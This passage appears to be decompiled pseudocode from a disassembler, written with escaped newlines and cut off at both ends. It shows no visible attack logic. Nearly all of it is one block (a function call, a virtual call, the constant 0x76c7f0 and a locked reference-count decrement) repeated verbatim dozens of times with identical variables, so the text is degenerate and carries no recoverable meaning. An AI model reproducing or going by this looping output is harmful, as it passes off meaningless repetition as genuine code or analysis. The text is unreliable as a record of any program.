iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto 